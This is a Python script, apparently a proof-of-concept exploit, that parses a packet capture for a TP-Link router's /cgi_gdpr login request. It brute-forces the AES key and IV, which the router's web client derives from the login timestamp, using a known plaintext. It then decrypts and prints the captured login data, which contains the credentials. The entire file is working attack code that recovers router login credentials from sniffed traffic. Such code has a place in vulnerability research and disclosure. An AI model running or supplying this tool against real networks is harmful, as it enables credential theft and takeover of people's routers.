import sys
import re
import binascii
import typing
import base64
import argparse

import tp_link_crypto

from scapy.all import PacketList, Packet, rdpcap
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


DEBUG = False


def print_d(msg: str):
    if DEBUG:
        print(msg)


def get_login_pkt(pkt_list: PacketList) -> typing.Union[typing.Tuple[Packet, str, str], None]:
    """
    Finds the first login request packet in a PCAP.
    :param pkt_list: The packet list of the PCAP.
    :return: A Tuple containing the login packet, sign field, and data field.
    """
    for pkt in pkt_list:
        pkt_bytes: bytes = bytes(pkt.payload)

        # Verify that the packet contains an HTTP request to the login endpoint
        login_endpoint: bytes = b"/cgi_gdpr"
        if login_endpoint not in pkt_bytes:
            continue

        # Find the sign and data fields
        match = re.search(b"sign=([A-Za-z0-9=]+)", pkt_bytes)
        if match:
            sign = match.group(1)
        else:
            continue
        match = re.search(b"data=([A-Za-z0-9=/+]+)", pkt_bytes)
        if match:
            data = match.group(1)
        else:
            continue

        # Check that these aren't references in misc JavaScript files
        if len(sign) >= 128 and len(data) > 64:
            print_d(pkt_bytes)
            sign_str = sign.decode()
            data_str = data.decode()
            print_d(f"Sign: {sign_str}")
            print_d(f"Data: {data_str}")
            return pkt, sign_str, data_str

    return None


def aes_ecb_decrypt(key: bytes, plaintext: bytes) -> bytes:
    """
    AES-ECB decrypt with PKCS #7 padding. This matches the AES options on TP-Link routers.
    :param key: The AES key
    :param plaintext: Data to encrypt
    :return: Ciphertext
    """
    cipher = Cipher(algorithms.AES(key), modes.ECB())
    decryptor = cipher.decryptor()
    ciphertext = decryptor.update(plaintext) + decryptor.finalize()
    return ciphertext


def xor(b1: bytes, b2: bytes) -> typing.Union[bytes, None]:
    """
    XOR two byte arrays of equal length.
    :param b1: A byte array to XOR
    :param b2: A byte array to XOR
    :return: The XOR result bytes or None if strings are not the same length.
    """
    if len(b1) != len(b2):
        print("[-] Attempted to XOR two byte arrays with different lengths")
        return None
    output: bytes = bytes()
    for itr in range(len(b1)):
        output += (b1[itr] ^ b2[itr]).to_bytes(1, byteorder="big")
    return output


def crack_key(epoch_secs_str: str, epoch_ms: int, data: bytes) -> typing.Union[typing.Tuple[str, str], None]:
    """
    The web client for TP-Link routers generates a 16 byte AES key and IV which are used to encrypt the login
    credentials. The key and IV are generated from an insecure source where 13 bytes are the Unix epoch time in
    milliseconds. Given a packet containing a login request and the time the packet was sent, brute force the AES key.
    :param epoch_secs_str: The Unix epoch time seconds to start brute forcing at
    :param epoch_ms: The Unix epoch time milliseconds field of the epoch_secs_str parameter
    :param data: The data field of the `/cgi_gdpr` login request
    :return: A tuple containing the AES key and IV on success, otherwise None
    """
    known_plaintext: bytes = b"8\r\n[/cgi/login#0"
    first_data_block = data[:16]  # Just the first AES block

    itr = 0
    while epoch_ms >= 0:
        for hundreds in range(10):
            for tens in range(10):
                for ones in range(10):
                    itr += 1
                    sys.stdout.write(f"\r{itr}")
                    aes_key = f"{epoch_secs_str}{epoch_ms:03d}{hundreds:d}{tens:d}{ones:d}"
                    decrypted_block: bytes = aes_ecb_decrypt(aes_key.encode(), first_data_block)
                    possible_timestamp = xor(decrypted_block, known_plaintext)
                    iv = possible_timestamp
                    possible_timestamp = possible_timestamp[:10]
                    try:
                        possible_timestamp_str = possible_timestamp.decode()
                    except UnicodeDecodeError:
                        continue
                    if possible_timestamp_str == epoch_secs_str:
                        # Wipe the brute force counter
                        sys.stdout.write("\r")

                        iv_str: str = iv.decode()
                        print(f"[+] AES Key: {aes_key}")
                        print(f"[+] AES IV: {iv_str}")
                        return aes_key, iv_str
        epoch_ms -= 1

    return None


def main(pcap_path: str):
    pkt_list: PacketList = rdpcap(pcap_path)
    ret = get_login_pkt(pkt_list)
    if ret is None:
        print("[-] Could not find a login packet")
        return 1
    print("[+] Found a login packet")
    login_pkt, sign, data = ret

    try:
        decoded_data: bytes = base64.b64decode(data)
    except binascii.Error:
        print("[-] Could not Base64 decode the login request's data field")
        return 1

    # The packet timestamp is NIC dependent (https://wiki.wireshark.org/Timestamps). On my Amazon Basics USB to
    # Ethernet adapter, it's in the following epoch float format: "1618851624.846030723".
    print(f"[*] Login request packet captured at Unix epoch time {login_pkt.time}")
    # Split the epoch float format into seconds and milliseconds
    timestamp_split = str(login_pkt.time).split(".")
    epoch_secs_str = timestamp_split[0]
    epoch_ms_str = timestamp_split[1][0:3]
    epoch_ms = int(epoch_ms_str)

    ret = crack_key(epoch_secs_str, epoch_ms, decoded_data)
    if ret is None:
        print("[-] Could not crack the AES key")
        return 1
    key, iv = ret

    # Decrypt the login request with the cracked key
    plaintext: bytes = tp_link_crypto.aes_decrypt(key.encode(), iv.encode(), decoded_data)
    # Remove the PKCS #7 padding
    num_padding_bytes = plaintext[-1]
    plaintext = plaintext[:-num_padding_bytes]
    print(plaintext.decode())


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("pcap", help="path to pcap or pcapng file containing a TP-Link GDPR login request", type=str)
    args = parser.parse_args()
    sys.exit(main(args.pcap))
